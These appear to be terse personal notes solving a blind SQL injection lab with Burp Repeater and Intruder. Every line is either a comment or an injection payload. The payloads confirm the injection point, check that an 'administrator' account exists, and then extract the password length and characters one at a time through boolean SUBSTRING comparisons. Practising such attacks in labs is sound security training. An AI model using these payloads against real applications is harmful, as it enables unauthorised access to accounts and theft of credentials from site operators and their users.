#using burp repeater

#Check if something changes at the page
L8b9m8jxhlzxPxPn'+and+1=1--
L8b9m8jxhlzxPxPn'+and+1=2--

#it's not a mysql server
L8b9m8jxhlzxPxPn'+and+1=1#

#check if there is a administrator username
x'+UNION+SELECT+'a'+FROM+users+WHERE+username='admin'--
x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--

#using burp intruder
#check the size of the password
x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>§1§--

#check the characters of the password
x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,§1§,1) > '§a§'--

#login
